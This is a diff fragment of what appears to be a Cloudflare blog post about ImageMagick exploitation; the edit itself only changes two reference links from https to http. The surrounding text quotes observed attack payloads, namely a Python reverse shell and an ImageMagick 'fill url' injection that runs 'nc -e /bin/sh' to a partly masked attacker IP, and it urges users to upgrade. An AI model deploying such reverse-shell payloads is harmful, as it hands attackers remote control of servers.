@@ -93,7 +93,7 @@ s.connect(("xx.xx.24.85"\x2c443));p=subprocess.call(\x5b"/bin/sh"\x2c"-i"\x5d);\
 fill 'url(https://profile-photos.example.com/production/000/003/658/b4eb8_
 xtralarge.png"|nc -e /bin/sh xx.xx.151.208
 </code></pre>
-	<p>The first uses <a href="https://linux.die.net/man/1/setsid" target="_blank">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hacker’s server. The second uses <a href="https://linux.die.net/man/1/nc" target="_blank">nc</a> to attempt the same thing.</p>
+	<p>The first uses <a href="http://linux.die.net/man/1/setsid" target="_blank">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hacker’s server. The second uses <a href="http://linux.die.net/man/1/nc" target="_blank">nc</a> to attempt the same thing.</p>
 	<p>All these payloads are designed to give the hacker unfettered access to the vulnerable web server. With a single exploit they can get remote access and then proceed to further hack the vulnerable web server at their leisure.</p>
 	<h3 id="conclusion">Conclusion</h3>
 	<p>CloudFlare continually updates our WAF as vulnerabilities are found and customers get automatic protection. Nevertheless, we urge all users of ImageMagick to upgrade as quickly as possible.</p>
